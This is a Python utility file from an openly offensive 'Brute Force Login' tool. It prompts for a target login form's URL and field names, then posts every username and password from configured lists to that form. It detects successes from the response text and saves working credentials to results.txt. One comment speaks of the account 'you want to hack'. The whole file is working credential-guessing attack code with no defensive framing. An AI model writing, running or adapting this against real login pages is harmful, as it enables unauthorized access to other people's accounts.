# utils.py
# By Sanix-darker

from app.settings import *
import requests
from sys import exit


def presentation():
    print("[+] # #############################################")
    print("[+] # => Brute Force Login <=                     #")
    print("[+] # By S@n1x d4rk3r                             #")
    print("[+] # #############################################")
    print("[+] Select a mode for detecting fields:")
    print("[+] 1-) Automatic mode (Will get all necessary field and proceed)")
    print("[+] 2-) Manual mode (you will provide necessary information before continue)")
    print("[+] -")
    print("[+] 0-) Stop the program")


def process_request(request, user, password, failed_aftertry, user_field, password_field):
    """[summary]

    Arguments:
        request {[type]} -- [description]
        user {[type]} -- [description]
        password {[type]} -- [description]
        failed_aftertry {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
        if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
            print("[+] Connection failed : Trying again ....")
            return
        else:
            failed_aftertry = failed_aftertry + 1
            print("[+] Connection failed : 404 Not Found (Verify your url)")
    else:
        # if you want to see the text result remove the comment here
        # print data.text
        if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
            print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
        else:
            if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
                result = "\n--------------------------------------------------------------"
                result += "\\OK!! \nTheese Credentials succeed:\n> user: " + user + " and password: " + password
                result += "--------------------------------------------------------------"
                with open("./results.txt", "w+") as frr:
                    frr.write(result)
                print(
                    "[+] A Match succeed 'user: " + user + " and password: " + password + "' and have been saved at "
                                                                                          "./results.txt")
                return
            else:
                print("Trying theese parameters: user: " + user + " and password: " + password)


def process_user(user, url, failed_aftertry, user_field, password_field):
    """[summary]

    Arguments:
        user {[type]} -- [description]
        url {[type]} -- [description]
        failed_aftertry {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    for password in PASSWORDS:
        dados = {user_field: user.replace('\n', ''),
                 password_field: password.replace('\n', '')}
        print("[+]", dados)
        # Doing the post form
        request = requests.post(url, data=dados)

        process_request(request, user, password, failed_aftertry, user_field, password_field)


def try_connection(url, user_field, password_field):
    """[summary]

    Arguments:
        url {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    print("[+] Connecting to: " + url + "......\n")
    # Put the target email you want to hack
    # user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
    failed_aftertry = 0
    for user in USERS:
        process_user(user, url, failed_aftertry, user_field, password_field)


def manual_mode():
    """[summary]
    """
    print("[+] Manual mode selected ")
    print("[+] After inspecting the LOGIN <form />, please fill here :")

    # Field's Form -------
    # The link of the website
    url = input("\n[+] Enter the target URL (it's the 'action' attribute on the form tag):")
    # The user_field in the form of the login
    user_field = input(
        "\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
    # The password_field in the form
    password_field = input(
        "\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")

    try_connection(url, user_field, password_field)


def extract_field_form(html_contain):
    """[summary]

    Arguments:
        html_contain {[type]} -- [description]
    """
    print("[+] Starting extraction...")


def automatic_mode():
    """[summary]
    """
    print("[+ This option is not yet ready....]")
    main()
    # # Field's Form -------
    # # The link of the website
    # url = input("\n[+] Enter the URL of the webSite and let me do the rest :")
    # r = requests.get(url)
    # extract_field_form(r.content)


def main():
    """[summary]
    """
    presentation()
    mode = int(input("[+] Choice: "))
    if mode == 1:
        automatic_mode()
    elif mode == 2:
        manual_mode()
    elif mode == 0:
        exit()
    else:
        main()